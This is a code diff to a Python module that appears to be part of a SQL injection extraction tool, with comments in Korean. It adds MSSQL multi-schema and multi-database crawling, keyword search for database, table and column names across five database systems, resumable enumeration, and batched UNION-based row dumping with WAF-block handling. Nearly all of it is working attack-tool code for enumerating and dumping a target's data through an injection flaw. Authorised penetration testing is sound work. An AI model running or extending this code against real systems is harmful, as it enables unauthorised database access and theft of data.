-        return "SELECT COUNT(*) FROM pg_database"
+        # pg_tables.schemaname과의 일관성을 위해 스키마 기준(information_schema.schemata)으로 통일
+        return "SELECT COUNT(*) FROM information_schema.schemata"
     if dbms == "Oracle":
         return "SELECT COUNT(*) FROM all_users"
     if dbms == "SQLite":
@@ -1067,7 +1243,8 @@ def _q_row_databases(dbms: str, n: int) -> str:
         return (f"SELECT name FROM master.sys.databases ORDER BY name "
                 f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
     if dbms == "PostgreSQL":
-        return f"SELECT datname FROM pg_database ORDER BY datname LIMIT 1 OFFSET {n}"
+        return (f"SELECT schema_name FROM information_schema.schemata "
+                f"ORDER BY schema_name LIMIT 1 OFFSET {n}")
     if dbms == "Oracle":
         return ("SELECT username FROM (SELECT username,ROW_NUMBER() OVER "
                 f"(ORDER BY username) rn FROM all_users) WHERE rn={n+1}")
@@ -1087,7 +1264,7 @@ def _q_base_databases(dbms: str) -> str:
     if dbms == "MSSQL":
         return "SELECT name AS itm FROM master.sys.databases ORDER BY name"
     if dbms == "PostgreSQL":
-        return "SELECT datname AS itm FROM pg_database ORDER BY datname"
+        return "SELECT schema_name AS itm FROM information_schema.schemata ORDER BY schema_name"
     if dbms == "Oracle":
         return "SELECT username AS itm FROM all_users"
     raise UnsupportedTechniqueError(f"DB base select 미지원 DBMS: {dbms}")
@@ -1112,7 +1289,9 @@ def _q_row_tables(dbms: str, db: str, n: int) -> str:
         return (f"SELECT table_name FROM information_schema.tables "
                 f"WHERE table_schema='{db}' LIMIT 1 OFFSET {n}")
     if dbms == "MSSQL":
-        return (f"SELECT name FROM [{db}].sys.tables ORDER BY name "
+        # 전 스키마 지원 — "schema.table" 형태로 반환해 스키마 정보를 함께 전달
+        return (f"SELECT SCHEMA_NAME(schema_id)+'.'+name FROM [{db}].sys.tables "
+                f"ORDER BY SCHEMA_NAME(schema_id),name "
                 f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
     if dbms == "PostgreSQL":
         return (f"SELECT tablename FROM pg_tables WHERE schemaname='{db}' "
@@ -1132,7 +1311,9 @@ def _q_base_tables(dbms: str, db: str) -> str:
         return (f"SELECT table_name AS itm FROM information_schema.tables "
                 f"WHERE table_schema='{db}' ORDER BY table_name")
     if dbms == "MSSQL":
-        return f"SELECT name AS itm FROM [{db}].sys.tables ORDER BY name"
+        # 전 스키마 지원 — "schema.table" 형태로 반환해 스키마 정보를 함께 전달
+        return (f"SELECT SCHEMA_NAME(schema_id)+'.'+name AS itm FROM [{db}].sys.tables "
+                f"ORDER BY SCHEMA_NAME(schema_id),name")
     if dbms == "PostgreSQL":
         return (f"SELECT tablename AS itm FROM pg_tables "
                 f"WHERE schemaname='{db}' ORDER BY tablename")
@@ -1148,9 +1329,10 @@ def _q_count_columns(dbms: str, db: str, tbl: str) -> str:
         return (f"SELECT COUNT(*) FROM information_schema.columns "
                 f"WHERE table_schema='{db}' AND table_name='{tbl}'")
     if dbms == "MSSQL":
+        schema, name = _mssql_split_table(tbl)
         return (f"SELECT COUNT(*) FROM [{db}].sys.columns c "
                 f"JOIN [{db}].sys.tables t ON c.object_id=t.object_id "
-                f"WHERE t.name='{tbl}'")
+                f"WHERE t.name='{name}' AND SCHEMA_NAME(t.schema_id)='{schema}'")
     if dbms == "PostgreSQL":
         return (f"SELECT COUNT(*) FROM information_schema.columns "
                 f"WHERE table_schema='{db}' AND table_name='{tbl}'")
@@ -1170,9 +1352,11 @@ def _q_row_columns(dbms: str, db: str, tbl: str, n: int) -> str:
                 f"WHERE table_schema='{db}' AND table_name='{tbl}' "
                 f"LIMIT 1 OFFSET {n}")
     if dbms == "MSSQL":
+        schema, name = _mssql_split_table(tbl)
         return (f"SELECT c.name FROM [{db}].sys.columns c "
                 f"JOIN [{db}].sys.tables t ON c.object_id=t.object_id "
-                f"WHERE t.name='{tbl}' ORDER BY c.column_id "
+                f"WHERE t.name='{name}' AND SCHEMA_NAME(t.schema_id)='{schema}' "
+                f"ORDER BY c.column_id "
                 f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
     if dbms == "PostgreSQL":
         return (f"SELECT column_name FROM information_schema.columns "
@@ -1194,9 +1378,11 @@ def _q_base_columns(dbms: str, db: str, tbl: str) -> str:
                 f"WHERE table_schema='{db}' AND table_name='{tbl}' "
                 f"ORDER BY ordinal_position")
     if dbms == "MSSQL":
+        schema, name = _mssql_split_table(tbl)
         return (f"SELECT c.name AS itm FROM [{db}].sys.columns c "
                 f"JOIN [{db}].sys.tables t ON c.object_id=t.object_id "
-                f"WHERE t.name='{tbl}' ORDER BY c.column_id")
+                f"WHERE t.name='{name}' AND SCHEMA_NAME(t.schema_id)='{schema}' "
+                f"ORDER BY c.column_id")
     if dbms == "PostgreSQL":
         return (f"SELECT column_name AS itm FROM information_schema.columns "
                 f"WHERE table_schema='{db}' AND table_name='{tbl}' "
@@ -1207,6 +1393,322 @@ def _q_base_columns(dbms: str, db: str, tbl: str) -> str:
     if dbms == "SQLite":
         return f"SELECT name AS itm FROM pragma_table_info('{tbl}') ORDER BY cid"
     raise UnsupportedTechniqueError(f"Column base select 미지원 DBMS: {dbms}")
+
+
+# ── 특수 검색모드 쿼리 빌더 ───────────────────────────────────────────────────
+# target: "database" | "table" | "column", match: "contains" | "exact"
+# MSSQL의 table/column은 여기서 처리하지 않음 — 전체 DB 순회가 필요해 별도 경로(_search_mssql_multidb) 사용.
+# table/column 결과는 DUMP_DELIM으로 결합된 위치 문자열(예: db, 또는 db+DELIM+table[+DELIM+column]).
+
+def _q_search_count(dbms: str, target: str, match: str, keyword: str) -> str:
+    """검색 결과 총 개수 쿼리."""
+    if target == "database":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("schema_name", match, keyword)
+            return f"SELECT COUNT(*) FROM information_schema.schemata WHERE {where}"
+        if dbms == "MSSQL":
+            where = _build_search_where("name", match, keyword)
+            return f"SELECT COUNT(*) FROM master.sys.databases WHERE {where}"
+        if dbms == "PostgreSQL":
+            where = _build_search_where("schema_name", match, keyword)
+            return f"SELECT COUNT(*) FROM information_schema.schemata WHERE {where}"
+        if dbms == "Oracle":
+            where = _build_search_where("username", match, keyword)
+            return f"SELECT COUNT(*) FROM all_users WHERE {where}"
+        raise UnsupportedTechniqueError(f"DB 검색 미지원 DBMS: {dbms}")
+
+    if target == "table":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("table_name", match, keyword)
+            return f"SELECT COUNT(*) FROM information_schema.tables WHERE {where}"
+        if dbms == "Oracle":
+            where = _build_search_where("table_name", match, keyword)
+            return f"SELECT COUNT(*) FROM all_tables WHERE {where}"
+        if dbms == "PostgreSQL":
+            where = _build_search_where("tablename", match, keyword)
+            return f"SELECT COUNT(*) FROM pg_tables WHERE {where}"
+        if dbms == "SQLite":
+            where = _build_search_where("name", match, keyword)
+            return f"SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND {where}"
+        raise UnsupportedTechniqueError(f"Table 검색 공용 경로 미지원 DBMS: {dbms}")
+
+    if target == "column":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("column_name", match, keyword)
+            return f"SELECT COUNT(*) FROM information_schema.columns WHERE {where}"
+        if dbms == "Oracle":
+            where = _build_search_where("column_name", match, keyword)
+            return f"SELECT COUNT(*) FROM all_tab_columns WHERE {where}"
+        if dbms == "PostgreSQL":
+            where = _build_search_where("column_name", match, keyword)
+            return f"SELECT COUNT(*) FROM information_schema.columns WHERE {where}"
+        if dbms == "SQLite":
+            where = _build_search_where("p.name", match, keyword)
+            return (f"SELECT COUNT(*) FROM sqlite_master m, pragma_table_info(m.name) p "
+                    f"WHERE m.type='table' AND {where}")
+        raise UnsupportedTechniqueError(f"Column 검색 공용 경로 미지원 DBMS: {dbms}")
+
+    raise UnsupportedTechniqueError(f"검색 대상 미지원: {target}")
+
+
+def _q_search_row(dbms: str, target: str, match: str, keyword: str, n: int) -> str:
+    """검색 결과 n번째 행 쿼리 — table/column은 DUMP_DELIM으로 위치를 결합해 단일 값으로 반환."""
+    delim = DUMP_DELIM
+    if target == "database":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("schema_name", match, keyword)
+            return (f"SELECT schema_name FROM information_schema.schemata "
+                    f"WHERE {where} ORDER BY schema_name LIMIT 1 OFFSET {n}")
+        if dbms == "MSSQL":
+            where = _build_search_where("name", match, keyword)
+            return (f"SELECT name FROM master.sys.databases WHERE {where} "
+                    f"ORDER BY name OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
+        if dbms == "PostgreSQL":
+            where = _build_search_where("schema_name", match, keyword)
+            return (f"SELECT schema_name FROM information_schema.schemata WHERE {where} "
+                    f"ORDER BY schema_name LIMIT 1 OFFSET {n}")
+        if dbms == "Oracle":
+            where = _build_search_where("username", match, keyword)
+            return ("SELECT username FROM (SELECT username,ROW_NUMBER() OVER "
+                    f"(ORDER BY username) rn FROM all_users WHERE {where}) WHERE rn={n+1}")
+        raise UnsupportedTechniqueError(f"DB 검색 미지원 DBMS: {dbms}")
+
+    if target == "table":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("table_name", match, keyword)
+            return (f"SELECT CONCAT(table_schema,'{delim}',table_name) FROM information_schema.tables "
+                    f"WHERE {where} ORDER BY table_schema,table_name LIMIT 1 OFFSET {n}")
+        if dbms == "Oracle":
+            where = _build_search_where("table_name", match, keyword)
+            return ("SELECT owner||'" + delim + "'||table_name FROM (SELECT owner,table_name,"
+                    "ROW_NUMBER() OVER (ORDER BY owner,table_name) rn FROM all_tables "
+                    f"WHERE {where}) WHERE rn={n+1}")
+        if dbms == "PostgreSQL":
+            where = _build_search_where("tablename", match, keyword)
+            return (f"SELECT schemaname||'{delim}'||tablename FROM pg_tables "
+                    f"WHERE {where} ORDER BY schemaname,tablename LIMIT 1 OFFSET {n}")
+        if dbms == "SQLite":
+            where = _build_search_where("name", match, keyword)
+            return (f"SELECT 'main{delim}'||name FROM sqlite_master "
+                    f"WHERE type='table' AND {where} ORDER BY name LIMIT 1 OFFSET {n}")
+        raise UnsupportedTechniqueError(f"Table 검색 공용 경로 미지원 DBMS: {dbms}")
+
+    if target == "column":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("column_name", match, keyword)
+            return (f"SELECT CONCAT(table_schema,'{delim}',table_name,'{delim}',column_name) "
+                    f"FROM information_schema.columns WHERE {where} "
+                    f"ORDER BY table_schema,table_name,ordinal_position LIMIT 1 OFFSET {n}")
+        if dbms == "Oracle":
+            where = _build_search_where("column_name", match, keyword)
+            return ("SELECT owner||'" + delim + "'||table_name||'" + delim + "'||column_name "
+                    "FROM (SELECT owner,table_name,column_name,ROW_NUMBER() OVER "
+                    "(ORDER BY owner,table_name,column_id) rn FROM all_tab_columns "
+                    f"WHERE {where}) WHERE rn={n+1}")
+        if dbms == "PostgreSQL":
+            where = _build_search_where("column_name", match, keyword)
+            return (f"SELECT table_schema||'{delim}'||table_name||'{delim}'||column_name "
+                    f"FROM information_schema.columns WHERE {where} "
+                    f"ORDER BY table_schema,table_name,ordinal_position LIMIT 1 OFFSET {n}")
+        if dbms == "SQLite":
+            where = _build_search_where("p.name", match, keyword)
+            return (f"SELECT 'main{delim}'||m.name||'{delim}'||p.name "
+                    f"FROM sqlite_master m, pragma_table_info(m.name) p "
+                    f"WHERE m.type='table' AND {where} ORDER BY m.name,p.cid LIMIT 1 OFFSET {n}")
+        raise UnsupportedTechniqueError(f"Column 검색 공용 경로 미지원 DBMS: {dbms}")
+
+    raise UnsupportedTechniqueError(f"검색 대상 미지원: {target}")
+
+
+def _q_search_base(dbms: str, target: str, match: str, keyword: str) -> str:
+    """검색 결과 기본 SELECT — itm alias, UNION 묶음 추출(_q_batch_list)의 서브쿼리로 사용."""
+    delim = DUMP_DELIM
+    if target == "database":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("schema_name", match, keyword)
+            return f"SELECT schema_name AS itm FROM information_schema.schemata WHERE {where} ORDER BY schema_name"
+        if dbms == "MSSQL":
+            where = _build_search_where("name", match, keyword)
+            return f"SELECT name AS itm FROM master.sys.databases WHERE {where} ORDER BY name"
+        if dbms == "PostgreSQL":
+            where = _build_search_where("schema_name", match, keyword)
+            return f"SELECT schema_name AS itm FROM information_schema.schemata WHERE {where} ORDER BY schema_name"
+        if dbms == "Oracle":
+            where = _build_search_where("username", match, keyword)
+            return f"SELECT username AS itm FROM all_users WHERE {where}"
+        raise UnsupportedTechniqueError(f"DB 검색 base select 미지원 DBMS: {dbms}")
+
+    if target == "table":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("table_name", match, keyword)
+            return (f"SELECT CONCAT(table_schema,'{delim}',table_name) AS itm FROM information_schema.tables "
+                    f"WHERE {where} ORDER BY table_schema,table_name")
+        if dbms == "Oracle":
+            where = _build_search_where("table_name", match, keyword)
+            return f"SELECT owner||'{delim}'||table_name AS itm FROM all_tables WHERE {where}"
+        if dbms == "PostgreSQL":
+            where = _build_search_where("tablename", match, keyword)
+            return (f"SELECT schemaname||'{delim}'||tablename AS itm FROM pg_tables "
+                    f"WHERE {where} ORDER BY schemaname,tablename")
+        if dbms == "SQLite":
+            where = _build_search_where("name", match, keyword)
+            return (f"SELECT 'main{delim}'||name AS itm FROM sqlite_master "
+                    f"WHERE type='table' AND {where} ORDER BY name")
+        raise UnsupportedTechniqueError(f"Table 검색 base select 미지원 DBMS: {dbms}")
+
+    if target == "column":
+        if dbms in ("MySQL", "MariaDB"):
+            where = _build_search_where("column_name", match, keyword)
+            return (f"SELECT CONCAT(table_schema,'{delim}',table_name,'{delim}',column_name) AS itm "
+                    f"FROM information_schema.columns WHERE {where} "
+                    f"ORDER BY table_schema,table_name,ordinal_position")
+        if dbms == "Oracle":
+            where = _build_search_where("column_name", match, keyword)
+            return (f"SELECT owner||'{delim}'||table_name||'{delim}'||column_name AS itm "
+                    f"FROM all_tab_columns WHERE {where}")
+        if dbms == "PostgreSQL":
+            where = _build_search_where("column_name", match, keyword)
+            return (f"SELECT table_schema||'{delim}'||table_name||'{delim}'||column_name AS itm "
+                    f"FROM information_schema.columns WHERE {where} "
+                    f"ORDER BY table_schema,table_name,ordinal_position")
+        if dbms == "SQLite":
+            where = _build_search_where("p.name", match, keyword)
+            return (f"SELECT 'main{delim}'||m.name||'{delim}'||p.name AS itm "
+                    f"FROM sqlite_master m, pragma_table_info(m.name) p "
+                    f"WHERE m.type='table' AND {where} ORDER BY m.name,p.cid")
+        raise UnsupportedTechniqueError(f"Column 검색 base select 미지원 DBMS: {dbms}")
+
+    raise UnsupportedTechniqueError(f"검색 대상 미지원: {target}")
+
+
+# ── MSSQL 전체 DB 순회 검색 (table/column 전용) ──────────────────────────────
+# PostgreSQL과 달리 MSSQL은 [db].sys.tables 형태의 3-part name으로 DB 전환 없이
+# 다른 DB의 카탈로그를 조회할 수 있어, DB 목록을 먼저 구한 뒤 DB별로 순회한다.
+
+def _q_search_count_mssql_db(target: str, qdb: str, match: str, keyword: str) -> str:
+    """MSSQL 특정 DB 내 table/column 검색 개수 쿼리. qdb는 _qid로 이미 quoting된 식별자."""
+    if target == "table":
+        where = _build_search_where("name", match, keyword)
+        return f"SELECT COUNT(*) FROM {qdb}.sys.tables WHERE {where}"
+    if target == "column":
+        where = _build_search_where("c.name", match, keyword)
+        return (f"SELECT COUNT(*) FROM {qdb}.sys.columns c "
+                f"JOIN {qdb}.sys.tables t ON c.object_id=t.object_id WHERE {where}")
+    raise UnsupportedTechniqueError(f"MSSQL DB별 검색 미지원 대상: {target}")
+
+
+def _q_search_row_mssql_db(target: str, qdb: str, match: str, keyword: str, n: int) -> str:
+    """MSSQL 특정 DB 내 table/column 검색 n번째 행 쿼리."""
+    delim = DUMP_DELIM
+    if target == "table":
+        # 전 스키마 지원 — "schema.table" 형태로 반환
+        where = _build_search_where("name", match, keyword)
+        return (f"SELECT SCHEMA_NAME(schema_id)+'.'+name FROM {qdb}.sys.tables WHERE {where} "
+                f"ORDER BY SCHEMA_NAME(schema_id),name OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
+    if target == "column":
+        where = _build_search_where("c.name", match, keyword)
+        return (f"SELECT CONCAT(SCHEMA_NAME(t.schema_id),'.',t.name,'{delim}',c.name) "
+                f"FROM {qdb}.sys.columns c "
+                f"JOIN {qdb}.sys.tables t ON c.object_id=t.object_id WHERE {where} "
+                f"ORDER BY SCHEMA_NAME(t.schema_id),t.name,c.column_id "
+                f"OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
+    raise UnsupportedTechniqueError(f"MSSQL DB별 검색 미지원 대상: {target}")
+
+
+def _mssql_all_db_names(ctx: ExtractCtx) -> List[str]:
+    """MSSQL 전체 DB명 목록 — table/column 검색의 DB 순회 기준점으로 사용.
+
+    ctx._mssql_db_names에 캐시 — count_search와 _search_mssql_multidb가 각각
+    호출해도 실제 추출은 최초 1회만 수행한다.
+    """
+    if ctx._mssql_db_names is not None:
+        return ctx._mssql_db_names
+    total = _extract_int(ctx, _q_count_databases("MSSQL"))
+    if not total:
+        ctx._mssql_db_names = []
+        return []
+    names: List[str] = []
+    for n in range(total):
+        if ctx.cancelled:
+            break
+        name = _extract_single(ctx, _q_row_databases("MSSQL", n))
+        if name:
+            names.append(name.strip())
+    ctx._mssql_db_names = names
+    return names
+
+
+def _search_mssql_multidb(ctx: ExtractCtx, target: str, match: str, keyword: str,
+                          progress_cb: Optional[Callable[[int, int], None]] = None,
+                          items_out: Optional[List[str]] = None,
+                          ) -> List[str]:
+    """MSSQL table/column 검색 — 전체 DB를 순회하며 검색.
+
+    요청 수가 많아지는 대신 PostgreSQL과 달리 완전한 전체 DB 검색이 가능하다.
+    v1은 UNION 묶음 최적화를 적용하지 않고 DB별로 1건씩 순차 추출한다
+    (다중 DB 순회 자체가 이미 비용을 감수하는 경로이므로 구현 단순성 우선).
+
+    resume 경로(items_out에 기존 항목이 있을 때):
+    - DB별 기저장 raw 집합(saved_by_db)을 구축해 완료 판정에 사용
+    - saved unique >= per_count → 완료 DB → 스킵
+    - saved unique < per_count → 미완료 DB → 처음부터 재스캔 + raw dedup으로 중복 제거
+    """
+    items = items_out if items_out is not None else []
+
+    # resume용 DB별 기저장 히트 집합 구축 (raw 기준 dedup · 완료 판정)
+    saved_by_db: Dict[str, set] = {}
+    for raw in items:
+        db_part = raw.split(DUMP_DELIM, 1)[0]
+        saved_by_db.setdefault(db_part, set()).add(raw)
+
+    dbs = _mssql_all_db_names(ctx)  # DB 목록 캐시 활용 (최초 1회만 추출)
+
+    # DB별 개수 — count_search가 먼저 호출된 경우 캐시 재사용, 아니면 직접 계산
+    cache_key = (target, match, keyword)
+    if cache_key in ctx._mssql_search_counts:
+        per_db_counts = ctx._mssql_search_counts[cache_key]
+    else:
+        per_db_counts = []
+        for db in dbs:
+            if ctx.cancelled:
+                break
+            qdb = _qid(ctx, db)
+            cnt = _extract_int(ctx, _q_search_count_mssql_db(target, qdb, match, keyword)) or 0
+            if cnt > 0:
+                per_db_counts.append((db, cnt))
+        ctx._mssql_search_counts[cache_key] = per_db_counts
+
+    total = sum(c for _, c in per_db_counts)
+    if total == 0:
+        if progress_cb:
+            progress_cb(1, 1)
+        return items
+
+    done = 0
+    for db, cnt in per_db_counts:
+        saved_set = saved_by_db.get(db, set())
+        # 완료 판정: 기저장 유일 히트 수 >= per_count → 스킵
+        if len(saved_set) >= cnt:
+            done += cnt
+            if progress_cb:
+                progress_cb(done, total)
+            continue
+
+        # 미완료 DB: 처음부터 재스캔 + dedup으로 중복 없이 신규 항목만 추가
+        qdb = _qid(ctx, db)
+        for n in range(cnt):
+            if ctx.cancelled:
+                return items
+            raw = _extract_single(ctx, _q_search_row_mssql_db(target, qdb, match, keyword, n))
+            if raw:
+                full_raw = f"{db}{DUMP_DELIM}{raw.strip()}"
+                if full_raw not in saved_set:
+                    items.append(full_raw)
+                    saved_set.add(full_raw)
+            done += 1
+            if progress_cb:
+                progress_cb(done, total)
+    return items
 
 
 def _q_batch_list(ctx: ExtractCtx, base_select: str, offset: int, batch: int) -> str:
@@ -1278,7 +1780,8 @@ def _q_row_dump(ctx: ExtractCtx, db: str, tbl: str, row_select: str, n: int) -> 
     if ctx.dbms in ("MySQL", "MariaDB"):
         return f"SELECT {row_select} FROM {qdb}.{qtbl} LIMIT 1 OFFSET {n}"
     if ctx.dbms == "MSSQL":
-        return (f"SELECT {row_select} FROM {qdb}.dbo.{qtbl} "
+        schema, name = _mssql_split_table(tbl)
+        return (f"SELECT {row_select} FROM {qdb}.{_qid(ctx, schema)}.{_qid(ctx, name)} "
                 f"ORDER BY (SELECT 1) OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY")
     if ctx.dbms == "PostgreSQL":
         return (f"SELECT {row_select} FROM {qdb}.{qtbl} "
@@ -1310,8 +1813,9 @@ def _q_row_dump_batch(ctx: ExtractCtx, db: str, tbl: str, row_select: str,
                 f"FROM {qdb}.{qtbl} LIMIT {batch} OFFSET {offset}) sub")
     if ctx.dbms == "MSSQL":
         # STRING_AGG은 SQL Server 2017+(v14) 이상 필요 — 이하 버전은 None 반환 → 폴백
+        schema, name = _mssql_split_table(tbl)
         return (f"SELECT STRING_AGG(CAST(r AS NVARCHAR(MAX)),'{delim}') "
-                f"FROM (SELECT {row_select} AS r FROM {qdb}.dbo.{qtbl} "
+                f"FROM (SELECT {row_select} AS r FROM {qdb}.{_qid(ctx, schema)}.{_qid(ctx, name)} "
                 f"ORDER BY (SELECT 1) "
                 f"OFFSET {offset} ROWS FETCH NEXT {batch} ROWS ONLY) sub")
     if ctx.dbms == "PostgreSQL":
@@ -1402,20 +1906,48 @@ def _dbms_info_queries(dbms: str) -> List[Tuple[str, str]]:
 
 
 def _list_items_batch(ctx: ExtractCtx, cnt: int, base_select: str,
-                      progress_cb: Optional[Callable[[int, int], None]] = None
+                      progress_cb: Optional[Callable[[int, int], None]] = None,
+                      items_out: Optional[List[str]] = None,
                       ) -> List[str]:
     """UNION 묶음 목록 추출 — _q_batch_list를 윈도우 단위로 호출 + 폴백.
 
-    묶음 실패(None) 또는 잘림(got < window) 시 해당 구간을 window=1로 재추출.
-    window=1 폴백은 이름이 짧아 집계 길이 한계를 절대 초과하지 않으므로 안전.
+    묶음 실패(None) 또는 잘림(got < window) 감지 시 즉시 batch_degraded=True로 전환
+    — 이후 모든 항목은 묶음 재시도 없이 1개씩 직행한다. 행이 넓어 집계 한계를
+    반복 초과하는 환경에서 윈도우마다 낭비되던 묶음 요청을 제거한다.
+    행이 좁은 환경은 잘림이 발생하지 않아 기존과 동일하게 묶음 이득을 유지한다.
+
+    items_out 전달 시 해당 리스트에 append (호출부가 미리 등록한 경우 중단되어도
+    누적 항목이 보존됨). 이미 담긴 항목 수(len)를 오프셋으로 사용해 이어받기.
     """
-    items: List[str] = []
+    items: List[str] = items_out if items_out is not None else []
     batch = ctx.union_row_batch
-    n = 0
+    n = len(items)
+    batch_degraded = False  # 첫 잘림 감지 시 True → 이후 1개씩 직행
+
     while n < cnt:
         if ctx.cancelled:
             break
         window = min(batch, cnt - n)
+
+        # 강등 상태: 묶음 재시도 없이 바로 1개씩 추출
+        if batch_degraded:
+            for i in range(n, n + window):
+                if ctx.cancelled:
+                    break
+                try:
+                    raw = _union_extract(ctx, _q_batch_list(ctx, base_select, i, 1))
+                except WAFBlockedError:
+                    raise
+                except InterruptedError:
+                    raise
+                except Exception:
+                    raw = None
+                if raw is not None:
+                    items.append(raw.strip())
+                if progress_cb:
+                    progress_cb(i + 1, cnt)
+            n += window
+            continue
 
         try:
             raw_batch = _union_extract(ctx, _q_batch_list(ctx, base_select, n, window))
@@ -1427,7 +1959,8 @@ def _list_items_batch(ctx: ExtractCtx, cnt: int, base_select: str,
             raw_batch = None
 
         if raw_batch is None:
-            # 윈도우 전체 window=1 폴백
+            # 묶음 실패 — 강등 후 윈도우 전체 1개씩 폴백
+            batch_degraded = True
             for i in range(n, n + window):
                 if ctx.cancelled:
                     break
@@ -1459,8 +1992,9 @@ def _list_items_batch(ctx: ExtractCtx, cnt: int, base_select: str,
             if progress_cb:
                 progress_cb(n + ri + 1, cnt)
 
-        # 잘림 감지 — 나머지 구간 window=1 폴백
+        # 잘림 감지 — 강등 후 나머지 구간 1개씩 폴백
         if got < window:
+            batch_degraded = True
             for i in range(n + got, n + window):
                 if ctx.cancelled:
                     break
@@ -1481,70 +2015,93 @@ def _list_items_batch(ctx: ExtractCtx, cnt: int, base_select: str,
     return items
 
 
-def _list_items(ctx: ExtractCtx, count_q: str,
+def _list_items(ctx: ExtractCtx, total: int,
                 row_q_fn: Callable[[int], str],
                 batch_base_select: Optional[str] = None,
-                progress_cb: Optional[Callable[[int, int], None]] = None
+                progress_cb: Optional[Callable[[int, int], None]] = None,
+                items_out: Optional[List[str]] = None,
                 ) -> List[str]:
-    """count + 페이지네이션 루프로 문자열 목록을 추출하는 공용 헬퍼.
+    """페이지네이션 루프로 문자열 목록을 추출하는 공용 헬퍼.
 
-    list_databases / list_tables / list_columns가 공유한다.
+    list_databases / list_tables / list_columns가 공유한다. total은 호출부가
+    미리 COUNT로 계산해 전달한다(엑셀에 저장되는 총개수와 동일 값 재사용 — 재개 시
+    COUNT 재요청 없이 이어받기 가능). items_out 전달 시 해당 리스트에 이어서 추출 —
+    이미 담긴 항목 수(len)를 오프셋으로 사용한다.
     UNION 기법 + union_row_batch > 1 + batch_base_select 제공 시 묶음 경로로 분기.
     """
-    cnt = _extract_int(ctx, count_q)
-    if cnt is None or cnt <= 0:
-        return []
+    items: List[str] = items_out if items_out is not None else []
+    if total <= 0 or len(items) >= total:
+        return items
 
     # UNION 묶음 경로
     if (ctx.technique == "union" and ctx.union_row_batch > 1
             and batch_base_select is not None):
-        return _list_items_batch(ctx, cnt, batch_base_select, progress_cb)
+        return _list_items_batch(ctx, total, batch_base_select, progress_cb, items_out=items)
 
-    # 기존 1개씩 경로
-    items: List[str] = []
-    for n in range(cnt):
+    # 기존 1개씩 경로 — 이미 담긴 항목 수(len(items))부터 이어받기
+    for n in range(len(items), total):
         if ctx.cancelled:
             break
         name = _extract_single(ctx, row_q_fn(n))
         if name is not None:
             items.append(name.strip())
         if progress_cb:
-            progress_cb(n + 1, cnt)
+            progress_cb(n + 1, total)
     return items
 
 
-def list_databases(ctx: ExtractCtx,
+def list_databases(ctx: ExtractCtx, total: int,
+                   items_out: Optional[List[str]] = None,
                    progress_cb: Optional[Callable[[int, int], None]] = None
                    ) -> List[str]:
-    """전체 DB(스키마) 목록 추출."""
+    """전체 DB(스키마) 목록 추출. total은 count_databases()로 미리 계산해 전달한다."""
     if ctx.dbms == "SQLite":
+        items = items_out if items_out is not None else []
+        if not items:
+            items.append("main")
         if progress_cb:
             progress_cb(1, 1)
-        return ["main"]
-    return _list_items(ctx, _q_count_databases(ctx.dbms),
-                       lambda n: _q_row_databases(ctx.dbms, n),
+        return items
+    return _list_items(ctx, total, lambda n: _q_row_databases(ctx.dbms, n),
                        batch_base_select=_q_base_databases(ctx.dbms),
-                       progress_cb=progress_cb)
+                       progress_cb=progress_cb, items_out=items_out)
 
 
-def list_tables(ctx: ExtractCtx, db: str,
+def list_tables(ctx: ExtractCtx, db: str, total: int,
+                items_out: Optional[List[str]] = None,
                 progress_cb: Optional[Callable[[int, int], None]] = None
                 ) -> List[str]:
-    """특정 DB의 테이블 목록 추출."""
-    return _list_items(ctx, _q_count_tables(ctx.dbms, db),
-                       lambda n: _q_row_tables(ctx.dbms, db, n),
+    """특정 DB의 테이블 목록 추출. total은 count_db_tables()로 미리 계산해 전달한다."""
+    return _list_items(ctx, total, lambda n: _q_row_tables(ctx.dbms, db, n),
                        batch_base_select=_q_base_tables(ctx.dbms, db),
-                       progress_cb=progress_cb)
+                       progress_cb=progress_cb, items_out=items_out)
 
 
-def list_columns(ctx: ExtractCtx, db: str, table: str,
+def list_columns(ctx: ExtractCtx, db: str, table: str, total: int,
+                 items_out: Optional[List[str]] = None,
                  progress_cb: Optional[Callable[[int, int], None]] = None
                  ) -> List[str]:
-    """특정 테이블의 컬럼 목록 추출."""
-    return _list_items(ctx, _q_count_columns(ctx.dbms, db, table),
-                       lambda n: _q_row_columns(ctx.dbms, db, table, n),
+    """특정 테이블의 컬럼 목록 추출. total은 count_table_columns()로 미리 계산해 전달한다."""
+    return _list_items(ctx, total, lambda n: _q_row_columns(ctx.dbms, db, table, n),
                        batch_base_select=_q_base_columns(ctx.dbms, db, table),
-                       progress_cb=progress_cb)
+                       progress_cb=progress_cb, items_out=items_out)
+
+
+def count_databases(ctx: ExtractCtx) -> Optional[int]:
+    """DB(스키마) 총 개수 — 리스트 total 계산용. SQLite는 쿼리 없이 1 고정."""
+    if ctx.dbms == "SQLite":
+        return 1
+    return _extract_int(ctx, _q_count_databases(ctx.dbms))
+
+
+def count_db_tables(ctx: ExtractCtx, db: str) -> Optional[int]:
+    """DB 내 테이블 총 개수 — 리스트 total 계산용."""
+    return _extract_int(ctx, _q_count_tables(ctx.dbms, db))
+
+
+def count_table_columns(ctx: ExtractCtx, db: str, table: str) -> Optional[int]:
+    """테이블 내 컬럼 총 개수 — 리스트 total 계산용."""
+    return _extract_int(ctx, _q_count_columns(ctx.dbms, db, table))
 
 
 def count_table(ctx: ExtractCtx, db: str, table: str) -> Optional[int]:
@@ -1554,10 +2111,85 @@ def count_table(ctx: ExtractCtx, db: str, table: str) -> Optional[int]:
     if ctx.dbms == "SQLite":
         total_q = f"SELECT COUNT(*) FROM {qtbl}"
     elif ctx.dbms == "MSSQL":
-        total_q = f"SELECT COUNT(*) FROM {qdb}.dbo.{qtbl}"
